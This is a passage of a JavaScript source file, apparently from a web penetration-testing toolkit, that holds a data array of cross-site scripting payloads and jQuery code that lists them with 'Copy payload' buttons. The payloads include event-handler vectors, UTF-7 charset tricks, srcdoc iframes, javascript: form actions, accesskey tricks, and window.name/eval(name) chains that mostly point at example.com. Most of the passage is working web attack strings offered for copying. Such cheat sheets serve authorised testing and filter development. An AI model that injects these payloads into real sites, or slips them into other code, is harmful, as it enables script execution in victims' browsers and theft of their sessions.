                "name": "onloadstart event for media elements in Firefox v107 and below",
                "value": "<img src=validimage.png onloadstart=alert(1)>",
                "browsers": [
                    "firefox"
                ]
            },
            {
                "name": "onloadend event for media elements in Firefox v107 and below",
                "value": "<input type=image onloadend=alert(1) src=validimage.png>",
                "browsers": [
                    "firefox"
                ]
            }
        ]
    },
    {
        "name": "Special tags",
        "id": "special",
        "data": [
            {
                "name": "Redirect to a different domain",
                "value": "<meta http-equiv=\"refresh\" content=\"0; url=//example.com\">",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Meta charset attribute UTF-7",
                "value": "<meta charset=\"UTF-7\" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-",
                "browsers": []
            },
            {
                "name": "Meta charset UTF-7",
                "value": "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-7\" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-",
                "browsers": []
            },
            {
                "name": "UTF-7 BOM characters (Has to be at the start of the document) 1",
                "value": "+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4-",
                "browsers": []
            },
            {
                "name": "UTF-7 BOM characters (Has to be at the start of the document) 2",
                "value": "+/v9 +ADw-script+AD4-alert(1)+ADw-/script+AD4-",
                "browsers": []
            },
            {
                "name": "UTF-7 BOM characters (Has to be at the start of the document) 3",
                "value": "+/v+ +ADw-script+AD4-alert(1)+ADw-/script+AD4-",
                "browsers": []
            },
            {
                "name": "UTF-7 BOM characters (Has to be at the start of the document) 4",
                "value": "+/v/ +ADw-script+AD4-alert(1)+ADw-/script+AD4-",
                "browsers": []
            },
            {
                "name": "Upgrade insecure requests",
                "value": "<meta http-equiv=\"Content-Security-Policy\" content=\"upgrade-insecure-requests\">",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Disable JavaScript via iframe sandbox",
                "value": "<iframe sandbox src=\"//example.com\"></iframe>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Disable referer",
                "value": "<meta name=\"referrer\" content=\"no-referrer\">",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            }
        ]
    },
    {
        "name": "Other attributes",
        "id": "other",
        "data": [
            {
                "name": "Using srcdoc attribute",
                "value": "<iframe srcdoc=\"<img src=1 onerror=alert(1)>\"></iframe>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Using srcdoc with entities",
                "value": "<iframe srcdoc=\"&lt;img src=1 onerror=alert(1)&gt;\"></iframe>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Click a submit element from anywhere on the page, even outside the form",
                "value": "<form action=\"javascript:alert(1)\"><input type=submit id=x></form><label for=x>XSS</label>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Hidden inputs: Access key attributes can enable XSS on normally unexploitable elements",
                "value": "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)",
                "browsers": [
                    "firefox"
                ]
            },
            {
                "name": "Link elements: Access key attributes can enable XSS on normally unexploitable elements",
                "value": "<link rel=\"canonical\" accesskey=\"X\" onclick=\"alert(1)\" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)",
                "browsers": [
                    "chrome"
                ]
            },
            {
                "name": "Download attribute can save a copy of the current webpage",
                "value": "<a href=# download=\"filename.html\">Test</a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Disable referrer using referrerpolicy",
                "value": "<img referrerpolicy=\"no-referrer\" src=\"//example.com\">",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Set window.name via parameter on the window.open function",
                "value": "<a href=# onclick=\"window.open('http://example.com/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')\">XSS</a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Set window.name via name attribute in a <iframe> tag",
                "value": "<iframe name=\"alert(1)\" src=\"https://example.com/xss/xss.php?context=js_string_single&x=%27;eval(name)//\"></iframe>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Set window.name via target attribute in a <base> tag",
                "value": "<base target=\"alert(1)\"><a href=\"http://example.com/xss/xss.php?context=js_string_single&x=%27;eval(name)//\">XSS via target in base tag</a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Set window.name via target attribute in a <a> tag",
                "value": "<a target=\"alert(1)\" href=\"http://example.com/xss/xss.php?context=js_string_single&x=%27;eval(name)//\">XSS via target in a tag</a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Set window.name via usemap attribute in a <img> tag",
                "value": "<img src=\"validimage.png\" width=\"10\" height=\"10\" usemap=\"#xss\"><map name=\"xss\"><area shape=\"rect\" coords=\"0,0,82,126\" target=\"alert(1)\" href=\"http://example.com/xss/xss.php?context=js_string_single&x=%27;eval(name)//\"></map>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Set window.name via target attribute in a <form> tag",
                "value": "<form action=\"http://example.com/xss/xss.php\" target=\"alert(1)\"><input type=hidden name=x value=\"';eval(name)//\"><input type=hidden name=context value=js_string_single><input type=\"submit\" value=\"XSS via target in a form\"></form>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Set window.name via formtarget attribute in a <input> tag type submit",
                "value": "<form><input type=hidden name=x value=\"';eval(name)//\"><input type=hidden name=context value=js_string_single><input type=\"submit\" formaction=\"http://example.com/xss/xss.php\" formtarget=\"alert(1)\" value=\"XSS via formtarget in input type submit\"></form>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Set window.name via formtarget attribute in a <input> tag type image",
                "value": "<form><input type=hidden name=x value=\"';eval(name)//\"><input type=hidden name=context value=js_string_single><input name=1 type=\"image\" src=\"validimage.png\" formaction=\"http://example.com/xss/xss.php\" formtarget=\"alert(1)\" value=\"XSS via formtarget in input type image\"></form>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            }
        ]
    }
]

jQuery(function () {

    $(document).on("change", ".tagSelect", function (e) {
        let tagIndex = $(this).find(':selected').attr('data-tag-index') || 0 
        let tag = data[0].data[$(this).attr("data-tag")].tags[tagIndex]
        let code = tag.code.replace('<*', '<' + $(this).val()).replace('*>', $(this).val() + '>')
        $(this).closest('.grid').find('.codeValue').text(code)
    })

    $(document).on("click", ".copy_icon", function (e) {
        let code = $(this).parent().children().find('.codeValue').text()
        if(code == ""){
            code = $(this).parent().find('.codeValue').text()
        }
        navigator.clipboard.writeText(code.trim())
    })

    for (var i = 0; i < data.length; i++) {
        let dt = []
        let params = {}
        if (data[i].id == 'event_handlers') {
            let keys = Object.keys(data[i].data)
            for (var j = 0; j < keys.length; j++) {
                let el = Object.assign({ "name": keys[j] }, data[i].data[keys[j]], { "i": i, "j": j })
                dt.push([el])
            }
            params = {
                data: dt,
                "columns": [
                    {
                        render: function (data, type, row) {
                            //console.log(data)
                            let sel = '', code = ''
                            for(var i=0; i < data.tags.length; i++){
                                if(data.tags[i].tag == '*'){
                                    sel = $('#tagSelect').html()
                                    code = data.tags[i].code.replace('<*', '<xss').replace('*>', 'xss>')
                                } else {
                                    if(i == 0) code = data.tags[i].code
                                    sel += `<option data-tag-index="${i}">${data.tags[i].tag}</option>`
                                }
                            }

                            return `
                                <div class="ui message" style="padding-left:45px;">
                                    <div class="ui mini icon button copy_icon" style="position: absolute;top: 1px;left: 1px;z-index: 1;">
                                    <i class="copy outline large icon" title="Copy payload"></i>
                                    </div>
                                    <div class="header">
                                    ${bptk_utils.escapeHtml(data.name)}
                                    </div>
                                    <p>${bptk_utils.escapeHtml(data.description)}</p>
                                    <div class="ui grid" >
                                        <div class="four wide column"><select class="tagSelect ui tiny dropdown" data-tag="${data.name}">${sel}</select></div>
                                        <div class="twelve wide column"><b class="codeValue" style="font-size:1.2em">${bptk_utils.escapeHtml(code)}</b></div>
                                    </div>
                                    
                                    <input type="hidden" name="i" value="${data.i}">
                                    <input type="hidden" name="j" value="${data.j}">
                                </div>
                       
                        `
                        }
                    }

                ],
            }
        }


        if (['consuming', 'restricted', 'protocols', 'encoding', 'obfuscation', 'waf', 'classic', 'special', 'other'].includes(data[i].id)) {

            for (var j = 0; j < data[i].data.length; j++) {
                let el = Object.assign(data[i].data[j], { "i": i, "j": j })
                dt.push([el])
            }
            params = {
                data: dt,
                "columns": [
                    {
                        render: function (data, type, row) {
                            return `
                                <div class="ui message" style="padding-left:45px">
                                    <div class="ui mini icon button copy_icon" style="position: absolute;top: 1px;left: 1px;z-index: 1;">
                                    <i class="copy outline large icon" title="Copy payload"></i>
                                    </div>
                                    <div class="header codeValue">
                                    ${bptk_utils.escapeHtml(data.value)}
                                    </div>
                                    <p>${bptk_utils.escapeHtml(data.name)}</p>
                                    <p>${data.browsers}</p>
                                    <input type="hidden" name="i" value=" ${data.i}">
                                    <input type="hidden" name="j" value=" ${data.j}">
                                </div>
                       
                        `
                        }
                    }

                ],
            }
        }

        bindTable(`#tbl_${data[i].id}`, params)
    }
})

/* Helpers */




